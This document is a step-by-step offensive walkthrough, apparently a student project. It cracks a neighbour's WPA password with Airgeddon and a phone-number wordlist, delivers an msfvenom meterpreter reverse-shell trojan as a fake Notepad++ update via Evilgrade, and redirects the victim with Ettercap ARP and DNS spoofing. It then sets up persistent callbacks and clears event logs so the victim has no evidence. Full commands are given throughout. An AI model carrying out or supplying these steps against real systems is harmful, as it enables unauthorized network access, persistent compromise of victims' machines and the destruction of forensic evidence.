# Wireless Hacking
Wireless Hacking will be more efficient if we know the attack flow of the target. In this project, the wireless hacking tools that will be using are Airgeddon and Evilgrade.

Airgeddon is written in bash and multi-use for Linux system to audit wireless networks and developed by V1s1t0rsh3r3. Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates.

## Summary
- [Attacking Procedures](#attacking-procedures)
	- [1. Reconnaissance and Scanning](#reconnaissance-and-scanning)
- [Link](#link)
	- [Anchor links](#anchor-links)
* 
    * 
 * [2. Gaining Access](#2.-gaining-access)
  * [1st STEP : Password cracking by using Airgeddon](#1st-step-:-password-cracking-by-using-airgeddon )
  * [2nd STEP : Create a reverse shell trojan using Metasploit](#2nd-step-:-create-a-reverse-shell-trojan-using-metasploit)
  * [3rd STEP : create a notepadplus module and spoof notepad++ website using Evilgrade](#3rd-step-:-create-a-notepadplus-module-and-spoof-notepad++-website-using-Evilgrade)
  * [4th STEP : build a meterpreter shell in the kali linux using Metasploit](#4th STEP : build a meterpreter shell in the kali linux using Metasploit)

## Attacking Procedures
### 1. Reconnaissance and Scanning
![image](https://user-images.githubusercontent.com/86700132/127674455-aa069a9b-2705-4043-a6c0-edc3b64eb545.png)
![image](https://user-images.githubusercontent.com/86700132/127674709-4c9650ce-6c1a-437e-8f20-894324a5b79c.png)

After opening the Airgeddon main menu terminal window in the Kali Linux, the first step we need to do is to capture some handshake. Choose option 5 and the script will move to handshake menu.



![image](https://user-images.githubusercontent.com/86700132/127674985-fd2cfa31-363b-4af4-8533-9dd76d8e25d5.png)
![image](https://user-images.githubusercontent.com/86700132/127675004-8be75330-27d7-4dc6-875d-1b5565bd170a.png)

The next step we need to perform is to scan on all available wireless networks detected by wlan0mon and select the targeted network by choosing option 4. After capturing some network, press CTRL+C to stop the scan.



![image](https://user-images.githubusercontent.com/86700132/127675108-326d01e0-6ae5-43a3-b6a9-0dbe17e7a047.png)

Then, select the target network. In this project, we choose No.17, which is Lenovo P70-A.



![image](https://user-images.githubusercontent.com/86700132/127675583-2e0f7d6d-fa24-4e5e-9d1d-8945fc55307e.png)

Next, choose option 5 capture the handshake. In our case, we are going to capture network for Lenovo P70-A.



![image](https://user-images.githubusercontent.com/86700132/127675707-16a8de3f-9b14-4963-aabd-92c8d9503928.png)
![image](https://user-images.githubusercontent.com/86700132/127675844-d927a5e6-7082-400a-9224-ab27beb98401.png)

Next step, select the deauth / disassoc amok mdk3 attack which is option 1 and wait around 20 seconds to forcefully disconnect a client from the access point and get the handshake.



![image](https://user-images.githubusercontent.com/86700132/127675907-a65d30ea-9ccf-409a-a236-7033a8dd610d.png)

The script will ask whether you get the handshake or not, insert y and press enter if you successful get the handshake which we will using it to perform wireless attack. Last, return to main menu and prepare for gaining access.



### 2. Gaining Access
#### 1st STEP : Password cracking by using Airgeddon 

Once we receive the network password hash from reconnaissance and scanning, we are going to crack that hash so that we can get the network password without identify the private key. In this case, we use a dictionary password cracking attack. We create a dictionary file that consists of list of phone numbers manually, since we know that the network password is phone number of our neighbor. Then we crack the network password by using the dictionary file.

Open a new terminal and use crunch to create a dictionary file.
```
root@kali:~# crunch 10 10 0123456789 -t 016%%%%%% -o /root/Desktop/phonenumber.txt
```


Come back to airgeddon terminal window. From the main menu choose option 6, which is offline WPA/WPA2 decrypt menu. 

![image](https://user-images.githubusercontent.com/86700132/127677222-2fe4cfaf-b39f-43e0-8689-7041864db89d.png)

Then choose dictionary attack against capture file and enter the path of wordlists file.
```
/root/Desktop/phonenumber.txt
```
![image](https://user-images.githubusercontent.com/86700132/127677552-37a11cb5-7de7-4097-99b4-b41002e509f5.png)



The terminal will start to run the dictionary file.

![image](https://user-images.githubusercontent.com/86700132/127677747-294a912f-7360-4dd3-a13c-802f00137896.png)

 
 
The terminal will display word “KEY FOUND!” once the key is detected.

![image](https://user-images.githubusercontent.com/86700132/127677772-9ffe6fa1-92ab-42f5-b3b5-581ef94b2bb8.png)


 
Finally, press enter to store the record in the default path.

![image](https://user-images.githubusercontent.com/86700132/127677843-57fbc3a1-c9ad-4ca7-a707-502e782e3388.png)


 
#### 2nd STEP : Create a reverse shell trojan using Metasploit
In this step, we create a reverse shell trojan so that targeted machine will listen to kali linux meterpreter shell once it is executed.

Now create a reverse shell trojan called "shell.exe" by using code below as figure below. This trojan will make the targeted machine listen to kali linux meterpreter shell. This trojan is created and located at root directory in kali linux.
```
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.144.142 LPORT=4444 -f exe > shell.exe
```
 
 
#### 3rd STEP : create a notepadplus module and spoof notepad++ website using Evilgrade
In this step, we create a notepadplus module and spoof notepad++ website. This module can be retrieved from spoof website. Once victim run his/her notepad++.exe and click yes button for updating their notepad++, their machine will request update module, which is notepadplus module from our spoof website. Then their machine starts to download the update received from notepadplus module and at the same time, the notepadplus also send the trojan to targeted machine and make it execute the trojan so that targeted machine listen to kali linux meterpreter shell.

Start the Evilgrade by typing the following commands:
```
root@kali:~# cd evilgrade
root@kali:~# ./evilgrade
```

If Evilgrade run successfully, then it will load the modules as shown in diagram below:

![image](https://user-images.githubusercontent.com/86700132/127678337-cf19482f-dcd5-4518-9886-fa2160a2ee52.png)



After Evilgrade is intialized, type configure notepadplus to create a notepadplus module and spoof notepad++ website.

Type command below:
```
evilgrade>  configure notepadplus
```

Then, we inject the malicious code into the notepadplus module. This malicious code will execute the trojan we set before when victim is updating their notepad++.
```
evilgrade(notepadplus)>set agent '["<%OUT%>/root/shell.exe<%OUT%>"]'
```
![image](https://user-images.githubusercontent.com/86700132/127678526-94f216f1-98c7-4e39-ae81-f3ce0f457463.png)



To ensure malicious code is properly injected, type command below to view the module and spoof website properties.
```
evilgrade(notepadplus)>show options
```
![image](https://user-images.githubusercontent.com/86700132/127678612-c004cf91-97a6-4a2c-87bb-d5a2c62c7c24.png)



#### 4th STEP : build a meterpreter shell in the kali linux using Metasploit
In this step, we create a reverse shell using Metasploit to wait for the targeted machine to connect kali linux meterpreter shell.

open Metasploit 
```
msf > use exploit/multi/handler
msf exploit(handler) > set LHOST 192.168.144.142
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
```
![image](https://user-images.githubusercontent.com/86700132/127679144-829cf665-960f-4374-930e-46e18f819444.png)



To ensure the payload settings are properly set, type :
```
msf exploit(handler) > show options
```
![image](https://user-images.githubusercontent.com/86700132/127678924-800da6a9-975e-4d5f-9682-4856855cc2bd.png)



Once the reverse shell is set properly, type command below to execute the reverse shell.
```
msf exploit(handler) > exploit
```

Once payload is set, go back to Evilgrade to execute the notepadplus module by using command below:
```
evilgrade(notepadplus)> start
```


#### 5th STEP: perform DNS spoofing attack using EtterCap
Now, we open the ettercap.dns file to add the spoof notepad++ website DNS (domain name server). To check the location of etter.dns type:
```
root@kali:~# locate etter.dns
```

Then, type:
```
root@kali:~# cd /etc/ettercap
```

After that, to enter the etter.dns, type:
```
root@kali:/etc/ettercap# nano etter.dns
```

Then scroll down the file until you see the " microsoft suck ; ) " sentence. That is the place we need to configure spoof DNS server. Type command below as the figure below to set the spoof DNS server. 
```
notepad-plus.sourceforge.net A 192.168.144.142
```
![image](https://user-images.githubusercontent.com/86700132/127679472-6663af98-72cb-49d8-874b-e5f3e78479b0.png)



To make sure the targeted machine is still havent disconnect from current network, type the command below:
```
root@kali:~# nmap –sn 192.168.144.0-255
```
![image](https://user-images.githubusercontent.com/86700132/127679566-99c44c79-6259-4d18-80ea-bfb220d31bb5.png)



Now type the command below to run the DNS spoofing attack toward targeted machine using EtterCap. -T means text mode. -Q means super quite mode. -M means perform a man-in-the-middle attack. -P means plugin. 
```
root@kali:~# ettercap -T -Q -M arp -P dns_spoof //192.168.144.148//
```
![image](https://user-images.githubusercontent.com/86700132/127679678-f3ea7edf-e147-4350-84d0-63ba333beb56.png)



The diagram above shows that DNS spoofing attack is performing. This attack scans every host available in current network, and then perform ARP poisoning attack to victim machine. 

Now our work is done, we just wait for the victim to run the notepad++ application. 


#### 6th STEP : waiting targeted machine to listen kali linux meterpreter shell
We will wait for the victim to run the notepad++ application. If the victim opens it, it will ask victim to update the notepad++. Then if the victim clicks yes for 2 times, the malicious code injected in notepadplus module will be executed and makes targeted machine to listen to kali linux meterpreter shell.

Let's jump to the targeted machine interface. When victim open the notepad++ executable. The executable will ask victim to update their notepad++. 

The victim click yes button:

![image](https://user-images.githubusercontent.com/86700132/127679864-6fa38aa8-7569-489e-9ac9-c5092c687c82.png)



The victim click yes button again:

![image](https://user-images.githubusercontent.com/86700132/127679956-23e87ef8-546f-4c41-ac80-9229c3032ca9.png)



Back to the kali linux, diagram below show that the IP address and MAC address of ARP poisoning targeted machine and perform the DNS spoofing attack towards it.

![image](https://user-images.githubusercontent.com/86700132/127680030-a289427b-6c2e-496f-9c94-d74743386e88.png)



The diagrams below show that the targeted machine establishes the spoof notepad++ website connection and asks for update package to that website. Then the notepadplus module recieves the requests from spoof notepad++ website and returns .php file required and executes malicious code.

![image](https://user-images.githubusercontent.com/86700132/127680092-e335df60-103b-4c03-8f0c-74e24da02028.png)
![image](https://user-images.githubusercontent.com/86700132/127680107-cea9e724-4e3d-475d-a226-6b0bffad4f22.png)



Back to the Metasploit, the diagram below shows that the targeted machine is listening to kali linux meterpreter shell.

![image](https://user-images.githubusercontent.com/86700132/127680150-c577091e-a085-480c-bb9b-0badc1f68534.png)



### 3. Maintaining Access
In this stage, we have finally access to the targeted machine. We configure the persistence in meterpreter shell to have a permanent automatic connection to targeted machine in targeted machine background. Once we set the persistence into the targeted machine, we can access the targeted machine by just waiting victim to connect the port of our attack machine. Then, if targeted machine disconnects to our port, we can just type command "exploit" and wait for targeted machine connect to port of our attack machine again. 

Now, we type the following command to configure a persistence meterpreter session. This persistence meterpreter session will wait until victim turn on his/her targeted machine and try to connect back to meterpreter shell for every 5 seconds to out attack machine on port 443.
```
meterpreter > run persistence –U –i 5 –p 443 –r 192.168.144.142
```
-U        Automatically start the agent when the User logs on

-i	The interval in seconds between each connection attempt

-p	The port on which the system running Metasploit is listening

-r	The IP of the system running Metasploit listening for the connect back

Let's try whether we can permanently connect to targeted machine. Type command:
```
exit
```

Then type command:
```
msf exploit(handler) > use multi/handler

msf exploit(handler) > set lhost 192.168.144.142

msf exploit(handler) > set lport 443

msf exploit(handler) > set payload windows/meterpreter/reverse_tcp

msf exploit(handler) > exploit
```

Diagram below shows that we can connect to targeted machine again. This prove that we can permanently connect to targeted machine if the targeted machine is log on.

![image](https://user-images.githubusercontent.com/86700132/127680747-b3158fbf-d070-4c65-a77f-9f4f78f463e3.png)


### 4. Clearing Track
In the last stage, of course, we need to clear the trace of our attack to targeted machine. This is very important because once we clear our trace, victim do not know his/her machine is being attack and once he/she detect our attack, he/she do not have evidences to prove it.

We type command below to clear the event logs of targeted machine so that our trace will be clear also. However, this will force the application executing in targeted machine to close too. 
```
clearev
```
![image](https://user-images.githubusercontent.com/86700132/127680886-91d7bad5-fd33-4648-9605-9a15ff0db236.png)


## References
* [Take precautions on public Wi-Fi](https://www.thestar.com.my/news/nation/2016/08/01/take-precautions-on-public-wifi-cybersecurity-firm-hackers-can-gather-sensitive-data-via-unsecure-co/)
* [Hack Like a Pro: How to Cover Your Tracks & Leave No Trace Behind on the Target System](https://null-byte.wonderhowto.com/how-to/hack-like-pro-cover-your-tracks-leave-no-trace-behind-target-system-0148123/)
* [Severe WiFi security flaw puts millions of devices at risk](https://www.engadget.com/2017/10/16/wifi-vulnerability-krack-attack/)
* [Hackers used luxury hotel Wi-Fi to steal business executive's data, researchers say.](https://www.theguardian.com/technology/2014/nov/10/hotel-wi-fi-infected-business-travellers-asia-kaspersky)
* [Infobyte/evilgrade](https://github.com/infobyte/evilgrade)
* [Video: How to Crack Weak Wi-Fi Passwords in Seconds with Airgeddon on Parrot OS](https://null-byte.wonderhowto.com/how-to/video-crack-weak-wi-fi-passwords-seconds-with-airgeddon-parrot-os-0181434/)
* [Meterpreter Service](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)
* [AIRGEDDON - Crack Encrypted WPA/WPA2 WiFi Key Password](https://thehacktoday.com/airgeddon-crack-encrypted-wpa-wpa2-wifi-password/)
* [Hacking with Evilgrade](https://www.youtube.com/watch?v=nReKwL93Fnk)
* [Hacking with Evilgrade2](https://pastebin.com/BAs4uXVL)
* [V1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)

## Credits
1.	Siew Kar Soon
2.	Chin Chee Hoong
3. Wong Zhen Ren
